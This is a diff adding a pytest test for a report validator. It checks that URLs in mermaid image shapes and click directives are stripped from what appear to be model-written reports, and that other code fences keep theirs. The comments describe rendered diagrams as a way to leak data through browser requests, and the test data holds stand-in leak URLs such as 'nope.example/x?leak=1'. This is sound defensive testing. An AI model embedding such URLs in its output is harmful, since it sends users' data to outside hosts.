@@ -3578,6 +3578,44 @@ def test_table_cells_are_validated_per_cell(report, expected):
 
 
 @pytest.mark.parametrize(
+    ("report", "expected"),
+    [
+        # mermaid >= 11.3 puts an image shape's URL on an SVG image the browser fetches, outside
+        # the markdown image pipeline, so an uncatalogued one in a report is an outbound request
+        # carrying whatever the model was willing to put in it.
+        (
+            '```mermaid\nflowchart TD\n  A@{ img: "https://nope.example/x?leak=1" }\n```',
+            '```mermaid\nflowchart TD\n  A@{ img: " }\n```',
+        ),
+        # A tilde fence reaches the renderer as mermaid too.
+        (
+            '~~~mermaid\nflowchart TD\n  A@{ img: "https://nope.example/y" }\n~~~',
+            '~~~mermaid\nflowchart TD\n  A@{ img: " }\n~~~',
+        ),
+        # click directives are the other way a diagram names a URL.
+        (
+            '```mermaid\nflowchart TD\n  A-->B\n  click A "https://nope.example/c"\n```',
+            '```mermaid\nflowchart TD\n  A-->B\n  click A "\n```',
+        ),
+        # Any other language is inert code and keeps its URL, which is the PR's whole point.
+        (
+            "```bash\ncurl https://nope.example/keep\n```",
+            "```bash\ncurl https://nope.example/keep\n```",
+        ),
+        # `mermaid\\b`, matching the renderer's own gate: mermaidx is not mermaid.
+        (
+            "```mermaidx\ncurl https://nope.example/keep\n```",
+            "```mermaidx\ncurl https://nope.example/keep\n```",
+        ),
+    ],
+)
+def test_mermaid_fences_are_validated_not_masked(report, expected):
+    """A mermaid fence is executed into a diagram rather than shown as code, so it stays subject
+    to the catalog. That is what main did before any code was masked, so nothing regresses."""
+    assert _validate_report(report, [], []) == expected
+
+
+@pytest.mark.parametrize(
     "report",
     [
         "Prose [Document: `git clone https://nope.example/r` ] end.",
